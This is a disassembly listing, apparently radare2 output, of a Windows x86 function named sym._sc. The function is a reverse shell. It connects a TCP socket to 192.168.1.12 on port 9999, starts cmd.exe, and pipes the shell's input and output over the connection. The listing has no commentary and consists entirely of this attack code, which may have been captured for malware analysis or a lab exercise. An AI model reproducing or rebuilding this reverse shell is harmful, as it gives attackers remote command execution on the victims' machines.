┌ (fcn) sym._sc 1225
│   sym._sc ();
│           ; var int local_a4ch @ ebp-0xa4c
│           ; var int local_a48h @ ebp-0xa48
│           ; var int local_a46h @ ebp-0xa46
│           ; var int local_a44h @ ebp-0xa44
│           ; var int local_a40h @ ebp-0xa40
│           ; var int local_a3ch @ ebp-0xa3c
│           ; var int local_a38h @ ebp-0xa38
│           ; var int local_a34h @ ebp-0xa34
│           ; var int local_a30h @ ebp-0xa30
│           ; var int local_a2ch @ ebp-0xa2c
│           ; var int local_a28h @ ebp-0xa28
│           ; var int local_a24h @ ebp-0xa24
│           ; var int local_a20h @ ebp-0xa20
│           ; var int local_a1ch @ ebp-0xa1c
│           ; var int local_a18h @ ebp-0xa18
│           ; var int local_a14h @ ebp-0xa14
│           ; var int local_a10h @ ebp-0xa10
│           ; var int local_a0ch @ ebp-0xa0c
│           ; var int local_a08h @ ebp-0xa08
│           ; var int local_608h @ ebp-0x608
│           ; var int local_208h @ ebp-0x208
│           ; var int local_1f8h @ ebp-0x1f8
│           ; var int local_1cch @ ebp-0x1cc
│           ; var int local_1c0h @ ebp-0x1c0
│           ; var int local_1bch @ ebp-0x1bc
│           ; var int local_1b8h @ ebp-0x1b8
│           ; var int local_1b4h @ ebp-0x1b4
│           ; var int local_1b2h @ ebp-0x1b2
│           ; var int local_1b0h @ ebp-0x1b0
│           ; var int local_1a4h @ ebp-0x1a4
│           ; var int local_14h @ ebp-0x14
│           ; var int local_10h @ ebp-0x10
│           ; var int local_ch @ ebp-0xc
│           ; var size_t local_4h @ esp+0x4
│           ; var int local_8h @ esp+0x8
│           ; var int local_ch_2 @ esp+0xc
│           ; var int local_10h_2 @ esp+0x10
│           ; var int local_14h_2 @ esp+0x14
│           ; var int local_18h @ esp+0x18
│           ; var int local_1ch @ esp+0x1c
│           ; var int local_20h @ esp+0x20
│           ; var int local_24h @ esp+0x24
│              ; CALL XREF from 0x00401a44 (sym._main)
│           0x00401570      55             push ebp
│           0x00401571      89e5           mov ebp, esp
│           0x00401573      81ec880a0000   sub esp, 0xa88
│           0x00401579      c745f4000000.  mov dword [local_ch], 0
│           0x00401580      c74424084400.  mov dword [local_8h], 0x44  ; 'D' ; [0x44:4]=0xcd09b400 ; 'D'
│           0x00401588      c74424040000.  mov dword [local_4h], 0     ; size_t n
│           0x00401590      8d8508feffff   lea eax, [local_1f8h]
│           0x00401596      890424         mov dword [esp], eax        ; int c
│           0x00401599      e8e6150000     call sym._memset            ; void *memset(void *s, int c, size_t n)
│           0x0040159e      c74424081000.  mov dword [local_8h], 0x10  ; [0x10:4]=184
│           0x004015a6      c74424040000.  mov dword [local_4h], 0     ; size_t n
│           0x004015ae      8d85f8fdffff   lea eax, [local_208h]
│           0x004015b4      890424         mov dword [esp], eax        ; int c
│           0x004015b7      e8c8150000     call sym._memset            ; void *memset(void *s, int c, size_t n)
│           0x004015bc      c785e0f5ffff.  mov dword [local_a20h], 0xc
│           0x004015c6      c785e8f5ffff.  mov dword [local_a18h], 1
│           0x004015d0      c785e4f5ffff.  mov dword [local_a1ch], 0
│           0x004015da      c744240c0004.  mov dword [local_ch_2], 0x400 ; [0x400:4]=0xb48dc3f3
│           0x004015e2      8d85e0f5ffff   lea eax, [local_a20h]
│           0x004015e8      89442408       mov dword [local_8h], eax
│           0x004015ec      8d85d4f5ffff   lea eax, [local_a2ch]
│           0x004015f2      89442404       mov dword [local_4h], eax
│           0x004015f6      8d85dcf5ffff   lea eax, [local_a24h]
│           0x004015fc      890424         mov dword [esp], eax
│           0x004015ff      a15c614000     mov eax, dword sym.imp.KERNEL32.dll_CreatePipe ; [0x40615c:4]=0x6268 reloc.KERNEL32.dll_CreatePipe_104 ; "hb"
│           0x00401604      ffd0           call eax
│           0x00401606      83ec10         sub esp, 0x10
│           0x00401609      85c0           test eax, eax
│       ┌─< 0x0040160b      0f8416040000   je 0x401a27
│       │   0x00401611      c74424080000.  mov dword [local_8h], 0
│       │   0x00401619      c74424040100.  mov dword [local_4h], 1
│       │   0x00401621      8d85d4f5ffff   lea eax, [local_a2ch]
│       │   0x00401627      890424         mov dword [esp], eax
│       │   0x0040162a      a1a8614000     mov eax, dword sym.imp.KERNEL32.dll_SetHandleInformation ; [0x4061a8:4]=0x63e6 reloc.KERNEL32.dll_SetHandleInformation_230
│       │   0x0040162f      ffd0           call eax
│       │   0x00401631      83ec0c         sub esp, 0xc
│       │   0x00401634      c744240c0004.  mov dword [local_ch_2], 0x400 ; [0x400:4]=0xb48dc3f3
│       │   0x0040163c      8d85e0f5ffff   lea eax, [local_a20h]
│       │   0x00401642      89442408       mov dword [local_8h], eax
│       │   0x00401646      8d85d8f5ffff   lea eax, [local_a28h]
│       │   0x0040164c      89442404       mov dword [local_4h], eax
│       │   0x00401650      8d85d0f5ffff   lea eax, [local_a30h]
│       │   0x00401656      890424         mov dword [esp], eax
│       │   0x00401659      a15c614000     mov eax, dword sym.imp.KERNEL32.dll_CreatePipe ; [0x40615c:4]=0x6268 reloc.KERNEL32.dll_CreatePipe_104 ; "hb"
│       │   0x0040165e      ffd0           call eax
│       │   0x00401660      83ec10         sub esp, 0x10
│       │   0x00401663      85c0           test eax, eax
│      ┌──< 0x00401665      0f84bf030000   je 0x401a2a
│      ││   0x0040166b      c74424080000.  mov dword [local_8h], 0
│      ││   0x00401673      c74424040100.  mov dword [local_4h], 1
│      ││   0x0040167b      8d85d0f5ffff   lea eax, [local_a30h]
│      ││   0x00401681      890424         mov dword [esp], eax
│      ││   0x00401684      a1a8614000     mov eax, dword sym.imp.KERNEL32.dll_SetHandleInformation ; [0x4061a8:4]=0x63e6 reloc.KERNEL32.dll_SetHandleInformation_230
│      ││   0x00401689      ffd0           call eax
│      ││   0x0040168b      83ec0c         sub esp, 0xc
│      ││   0x0040168e      c785bcf5ffff.  mov dword [local_a44h], 0
│      ││   0x00401698      c785c0f5ffff.  mov dword [local_a40h], 0
│      ││   0x004016a2      c785c8f5ffff.  mov dword [local_a38h], 0
│      ││   0x004016ac      c785c4f5ffff.  mov dword [local_a3ch], 0xa
│      ││   0x004016b6      c785ccf5ffff.  mov dword [local_a34h], 0x64 ; 'd'
│      ││   0x004016c0      8b85d0f5ffff   mov eax, dword [local_a30h]
│      ││   0x004016c6      8d95bcf5ffff   lea edx, [local_a44h]
│      ││   0x004016cc      89542404       mov dword [local_4h], edx
│      ││   0x004016d0      890424         mov dword [esp], eax
│      ││   0x004016d3      a1a4614000     mov eax, dword sym.imp.KERNEL32.dll_SetCommTimeouts ; [0x4061a4:4]=0x63d4 reloc.KERNEL32.dll_SetCommTimeouts_212
│      ││   0x004016d8      ffd0           call eax
│      ││   0x004016da      83ec08         sub esp, 8
│      ││   0x004016dd      8b85d8f5ffff   mov eax, dword [local_a28h]
│      ││   0x004016e3      8d95bcf5ffff   lea edx, [local_a44h]
│      ││   0x004016e9      89542404       mov dword [local_4h], edx
│      ││   0x004016ed      890424         mov dword [esp], eax
│      ││   0x004016f0      a1a4614000     mov eax, dword sym.imp.KERNEL32.dll_SetCommTimeouts ; [0x4061a4:4]=0x63d4 reloc.KERNEL32.dll_SetCommTimeouts_212
│      ││   0x004016f5      ffd0           call eax
│      ││   0x004016f7      83ec08         sub esp, 8
│      ││   0x004016fa      8b85dcf5ffff   mov eax, dword [local_a24h]
│      ││   0x00401700      8d95bcf5ffff   lea edx, [local_a44h]
│      ││   0x00401706      89542404       mov dword [local_4h], edx
│      ││   0x0040170a      890424         mov dword [esp], eax
│      ││   0x0040170d      a1a4614000     mov eax, dword sym.imp.KERNEL32.dll_SetCommTimeouts ; [0x4061a4:4]=0x63d4 reloc.KERNEL32.dll_SetCommTimeouts_212
│      ││   0x00401712      ffd0           call eax
│      ││   0x00401714      83ec08         sub esp, 8
│      ││   0x00401717      8b85d4f5ffff   mov eax, dword [local_a2ch]
│      ││   0x0040171d      8d95bcf5ffff   lea edx, [local_a44h]
│      ││   0x00401723      89542404       mov dword [local_4h], edx
│      ││   0x00401727      890424         mov dword [esp], eax
│      ││   0x0040172a      a1a4614000     mov eax, dword sym.imp.KERNEL32.dll_SetCommTimeouts ; [0x4061a4:4]=0x63d4 reloc.KERNEL32.dll_SetCommTimeouts_212
│      ││   0x0040172f      ffd0           call eax
│      ││   0x00401731      83ec08         sub esp, 8
│      ││   0x00401734      66c7854cfeff.  mov word [local_1b4h], 2
│      ││   0x0040173d      c704240f2700.  mov dword [esp], 0x270f     ; [0x270f:4]=0x3531
│      ││   0x00401744      a150624000     mov eax, dword sym.imp.WS2_32.dll_htons ; [0x406250:4]=0x65ec reloc.WS2_32.dll_htons_236
│      ││   0x00401749      ffd0           call eax
│      ││   0x0040174b      83ec04         sub esp, 4
│      ││   0x0040174e      6689854efeff.  mov word [local_1b2h], ax
│      ││   0x00401755      c70424244040.  mov dword [esp], str.192.168.1.12 ; [0x404024:4]=0x2e323931 ; "192.168.1.12"
│      ││   0x0040175c      a154624000     mov eax, dword sym.imp.WS2_32.dll_inet_addr ; [0x406254:4]=0x65f4 reloc.WS2_32.dll_inet_addr_244
│      ││   0x00401761      ffd0           call eax
│      ││   0x00401763      83ec04         sub esp, 4
│      ││   0x00401766      898550feffff   mov dword [local_1b0h], eax
│      ││   0x0040176c      8d855cfeffff   lea eax, [local_1a4h]
│      ││   0x00401772      89442404       mov dword [local_4h], eax
│      ││   0x00401776      c70424020200.  mov dword [esp], 0x202      ; [0x202:4]=0
│      ││   0x0040177d      a148624000     mov eax, dword sym.imp.WS2_32.dll_WSAStartup ; [0x406248:4]=0x65d4 reloc.WS2_32.dll_WSAStartup_212
│      ││   0x00401782      ffd0           call eax
│      ││   0x00401784      83ec08         sub esp, 8
│      ││   0x00401787      c74424080600.  mov dword [local_8h], 6
│      ││   0x0040178f      c74424040100.  mov dword [local_4h], 1
│      ││   0x00401797      c70424020000.  mov dword [esp], 2
│      ││   0x0040179e      a160624000     mov eax, dword sym.imp.WS2_32.dll_socket ; [0x406260:4]=0x6610 reloc.WS2_32.dll_socket_16
│      ││   0x004017a3      ffd0           call eax
│      ││   0x004017a5      83ec0c         sub esp, 0xc
│      ││   0x004017a8      8945f0         mov dword [local_10h], eax
│      ││   0x004017ab      c74424081000.  mov dword [local_8h], 0x10  ; [0x10:4]=184
│      ││   0x004017b3      8d854cfeffff   lea eax, [local_1b4h]
│      ││   0x004017b9      89442404       mov dword [local_4h], eax
│      ││   0x004017bd      8b45f0         mov eax, dword [local_10h]
│      ││   0x004017c0      890424         mov dword [esp], eax
│      ││   0x004017c3      a14c624000     mov eax, dword sym.imp.WS2_32.dll_connect ; [0x40624c:4]=0x65e2 reloc.WS2_32.dll_connect_226
│      ││   0x004017c8      ffd0           call eax
│      ││   0x004017ca      83ec0c         sub esp, 0xc
│      ││   0x004017cd      8945ec         mov dword [local_14h], eax
│      ││   0x004017d0      837dec00       cmp dword [local_14h], 0
│     ┌───< 0x004017d4      0f8553020000   jne 0x401a2d
│     │││   0x004017da      8b45f0         mov eax, dword [local_10h]
│     │││   0x004017dd      8985b4f5ffff   mov dword [local_a4ch], eax
│     │││   0x004017e3      66c785b8f5ff.  mov word [local_a48h], 0x100
│     │││   0x004017ec      66c785baf5ff.  mov word [local_a46h], 0
│     │││   0x004017f5      c78508feffff.  mov dword [local_1f8h], 0x44 ; 'D'
│     │││   0x004017ff      8b85dcf5ffff   mov eax, dword [local_a24h]
│     │││   0x00401805      898540feffff   mov dword [local_1c0h], eax
│     │││   0x0040180b      8b85d8f5ffff   mov eax, dword [local_a28h]
│     │││   0x00401811      898544feffff   mov dword [local_1bch], eax
│     │││   0x00401817      8b85d8f5ffff   mov eax, dword [local_a28h]
│     │││   0x0040181d      898548feffff   mov dword [local_1b8h], eax
│     │││   0x00401823      8b8534feffff   mov eax, dword [local_1cch]
│     │││   0x00401829      80cc01         or ah, 1
│     │││   0x0040182c      898534feffff   mov dword [local_1cch], eax
│     │││   0x00401832      8d85f8fdffff   lea eax, [local_208h]
│     │││   0x00401838      89442424       mov dword [local_24h], eax
│     │││   0x0040183c      8d8508feffff   lea eax, [local_1f8h]
│     │││   0x00401842      89442420       mov dword [local_20h], eax
│     │││   0x00401846      c744241c0000.  mov dword [local_1ch], 0
│     │││   0x0040184e      c74424180000.  mov dword [local_18h], 0
│     │││   0x00401856      c74424140000.  mov dword [local_14h_2], 0
│     │││   0x0040185e      c74424100100.  mov dword [local_10h_2], 1
│     │││   0x00401866      c744240c0000.  mov dword [local_ch_2], 0
│     │││   0x0040186e      c74424080000.  mov dword [local_8h], 0
│     │││   0x00401876      c74424040000.  mov dword [local_4h], 0
│     │││   0x0040187e      c70424314040.  mov dword [esp], str.C:_windows_system32_cmd.exe ; [0x404031:4]=0x775c3a43 ; "C:\\windows\\system32\\cmd.exe"
│     │││   0x00401885      a160614000     mov eax, dword sym.imp.KERNEL32.dll_CreateProcessA ; [0x406160:4]=0x6276 reloc.KERNEL32.dll_CreateProcessA_118 ; "vb"
│     │││   0x0040188a      ffd0           call eax
│     │││   0x0040188c      83ec28         sub esp, 0x28               ; '('
│     │││   0x0040188f      8945ec         mov dword [local_14h], eax
│     │││   0x00401892      837dec00       cmp dword [local_14h], 0
│    ┌────< 0x00401896      0f8494010000   je 0x401a30
│    ││││      ; JMP XREF from 0x00401a22 (sym._sc)
│    ││││      ; JMP XREF from 0x004019d5 (sym._sc)
│ ┌┌┌─────> 0x0040189c      8b85d0f5ffff   mov eax, dword [local_a30h]
│ ↑↑↑││││   0x004018a2      c74424140000.  mov dword [local_14h_2], 0
│ ↑↑↑││││   0x004018aa      8d95ecf5ffff   lea edx, [local_a14h]
│ ↑↑↑││││   0x004018b0      89542410       mov dword [local_10h_2], edx
│ ↑↑↑││││   0x004018b4      8d95f4f5ffff   lea edx, [local_a0ch]
│ ↑↑↑││││   0x004018ba      8954240c       mov dword [local_ch_2], edx
│ ↑↑↑││││   0x004018be      c74424080004.  mov dword [local_8h], 0x400 ; [0x400:4]=0xb48dc3f3
│ ↑↑↑││││   0x004018c6      8d95f8f5ffff   lea edx, [local_a08h]
│ ↑↑↑││││   0x004018cc      89542404       mov dword [local_4h], edx
│ ↑↑↑││││   0x004018d0      890424         mov dword [esp], eax
│ ↑↑↑││││   0x004018d3      a198614000     mov eax, dword sym.imp.KERNEL32.dll_PeekNamedPipe ; [0x406198:4]=0x639e reloc.KERNEL32.dll_PeekNamedPipe_158
│ ↑↑↑││││   0x004018d8      ffd0           call eax
│ ↑↑↑││││   0x004018da      83ec18         sub esp, 0x18
│ ↑↑↑││││   0x004018dd      8b85ecf5ffff   mov eax, dword [local_a14h]
│ ↑↑↑││││   0x004018e3      85c0           test eax, eax
│ ────────< 0x004018e5      7472           je 0x401959
│ ↑↑↑││││   0x004018e7      8b85d0f5ffff   mov eax, dword [local_a30h]
│ ↑↑↑││││   0x004018ed      c74424100000.  mov dword [local_10h_2], 0
│ ↑↑↑││││   0x004018f5      8d95f4f5ffff   lea edx, [local_a0ch]
│ ↑↑↑││││   0x004018fb      8954240c       mov dword [local_ch_2], edx
│ ↑↑↑││││   0x004018ff      c74424080004.  mov dword [local_8h], 0x400 ; [0x400:4]=0xb48dc3f3
│ ↑↑↑││││   0x00401907      8d95f8f5ffff   lea edx, [local_a08h]
│ ↑↑↑││││   0x0040190d      89542404       mov dword [local_4h], edx
│ ↑↑↑││││   0x00401911      890424         mov dword [esp], eax
│ ↑↑↑││││   0x00401914      a1a0614000     mov eax, dword sym.imp.KERNEL32.dll_ReadFile ; [0x4061a0:4]=0x63c8 reloc.KERNEL32.dll_ReadFile_200
│ ↑↑↑││││   0x00401919      ffd0           call eax
│ ↑↑↑││││   0x0040191b      83ec14         sub esp, 0x14
│ ↑↑↑││││   0x0040191e      8945ec         mov dword [local_14h], eax
│ ↑↑↑││││   0x00401921      837dec00       cmp dword [local_14h], 0
│ ────────< 0x00401925      7432           je 0x401959
│ ↑↑↑││││   0x00401927      8b85f4f5ffff   mov eax, dword [local_a0ch]
│ ↑↑↑││││   0x0040192d      c744240c0000.  mov dword [local_ch_2], 0
│ ↑↑↑││││   0x00401935      89442408       mov dword [local_8h], eax
│ ↑↑↑││││   0x00401939      8d85f8f5ffff   lea eax, [local_a08h]
│ ↑↑↑││││   0x0040193f      89442404       mov dword [local_4h], eax
│ ↑↑↑││││   0x00401943      8b45f0         mov eax, dword [local_10h]
│ ↑↑↑││││   0x00401946      890424         mov dword [esp], eax
│ ↑↑↑││││   0x00401949      a15c624000     mov eax, dword sym.imp.WS2_32.dll_send ; [0x40625c:4]=0x6608 reloc.WS2_32.dll_send_8
│ ↑↑↑││││   0x0040194e      ffd0           call eax
│ ↑↑↑││││   0x00401950      83ec10         sub esp, 0x10
│ ↑↑↑││││   0x00401953      8985f0f5ffff   mov dword [local_a10h], eax
│ ────────> 0x00401959      c74424080a00.  mov dword [local_8h], 0xa
│ ↑↑↑││││   0x00401961      c74424040100.  mov dword [local_4h], 1
│ ↑↑↑││││   0x00401969      8d85b4f5ffff   lea eax, [local_a4ch]
│ ↑↑↑││││   0x0040196f      890424         mov dword [esp], eax
│ ↑↑↑││││   0x00401972      e8d9000000     call sym._WSAPoll_12
│ ↑↑↑││││   0x00401977      83ec0c         sub esp, 0xc
│ ↑↑↑││││   0x0040197a      8945ec         mov dword [local_14h], eax
│ ↑↑↑││││   0x0040197d      837decff       cmp dword [local_14h], 0xffffffffffffffff
│ ────────< 0x00401981      0f84ac000000   je 0x401a33
│ ↑↑↑││││   0x00401987      837dec00       cmp dword [local_14h], 0
│ ────────< 0x0040198b      0f8e0bffffff   jle 0x40189c
│ ↑↑↑││││   0x00401991      c744240c0000.  mov dword [local_ch_2], 0
│ ↑↑↑││││   0x00401999      c74424080004.  mov dword [local_8h], 0x400 ; [0x400:4]=0xb48dc3f3
│ ↑↑↑││││   0x004019a1      8d85f8f9ffff   lea eax, [local_608h]
│ ↑↑↑││││   0x004019a7      89442404       mov dword [local_4h], eax
│ ↑↑↑││││   0x004019ab      8b45f0         mov eax, dword [local_10h]
│ ↑↑↑││││   0x004019ae      890424         mov dword [esp], eax
│ ↑↑↑││││   0x004019b1      a158624000     mov eax, dword sym.imp.WS2_32.dll_recv ; [0x406258:4]=0x6600 reloc.WS2_32.dll_recv_0
│ ↑↑↑││││   0x004019b6      ffd0           call eax
│ ↑↑↑││││   0x004019b8      83ec10         sub esp, 0x10
│ ↑↑↑││││   0x004019bb      8985f4f5ffff   mov dword [local_a0ch], eax
│ ↑↑↑││││   0x004019c1      8b85f4f5ffff   mov eax, dword [local_a0ch]
│ ↑↑↑││││   0x004019c7      85c0           test eax, eax
│ ────────< 0x004019c9      750f           jne 0x4019da
│ ↑↑↑││││   0x004019cb      8b85f4f5ffff   mov eax, dword [local_a0ch]
│ ↑↑↑││││   0x004019d1      85c0           test eax, eax
│ ────────< 0x004019d3      7461           je 0x401a36
│ └───────< 0x004019d5      e9c2feffff     jmp 0x40189c
│ ────────> 0x004019da      90             nop
│  ↑↑││││   0x004019db      8b85f4f5ffff   mov eax, dword [local_a0ch]
│  ↑↑││││   0x004019e1      85c0           test eax, eax
│  └──────< 0x004019e3      0f84b3feffff   je 0x40189c
│   ↑││││   0x004019e9      8b95f4f5ffff   mov edx, dword [local_a0ch]
│   ↑││││   0x004019ef      8b85d4f5ffff   mov eax, dword [local_a2ch]
│   ↑││││   0x004019f5      c74424100000.  mov dword [local_10h_2], 0
│   ↑││││   0x004019fd      8d8df0f5ffff   lea ecx, [local_a10h]
│   ↑││││   0x00401a03      894c240c       mov dword [local_ch_2], ecx
│   ↑││││   0x00401a07      89542408       mov dword [local_8h], edx
│   ↑││││   0x00401a0b      8d95f8f9ffff   lea edx, [local_608h]
│   ↑││││   0x00401a11      89542404       mov dword [local_4h], edx
│   ↑││││   0x00401a15      890424         mov dword [esp], eax
│   ↑││││   0x00401a18      a1c8614000     mov eax, dword sym.imp.KERNEL32.dll_WriteFile ; [0x4061c8:4]=0x6484 reloc.KERNEL32.dll_WriteFile_132
│   ↑││││   0x00401a1d      ffd0           call eax
│   ↑││││   0x00401a1f      83ec14         sub esp, 0x14
│   └─────< 0x00401a22      e975feffff     jmp 0x40189c
│    │││└─> 0x00401a27      90             nop
│    │││┌─< 0x00401a28      eb0d           jmp 0x401a37
│    ││└──> 0x00401a2a      90             nop
│    ││┌──< 0x00401a2b      eb0a           jmp 0x401a37
│    │└───> 0x00401a2d      90             nop
│    │┌───< 0x00401a2e      eb07           jmp 0x401a37
│    └────> 0x00401a30      90             nop
│    ┌────< 0x00401a31      eb04           jmp 0x401a37
│ ────────> 0x00401a33      90             nop
│   ┌─────< 0x00401a34      eb01           jmp 0x401a37
│ ────────> 0x00401a36      90             nop
│   │││││      ; JMP XREF from 0x00401a28 (sym._sc)
│   │││││      ; JMP XREF from 0x00401a2b (sym._sc)
│   │││││      ; JMP XREF from 0x00401a2e (sym._sc)
│   │││││      ; JMP XREF from 0x00401a31 (sym._sc)
│   │││││      ; JMP XREF from 0x00401a34 (sym._sc)
│   └└└└└─> 0x00401a37      c9             leave
└           0x00401a38      c3             ret
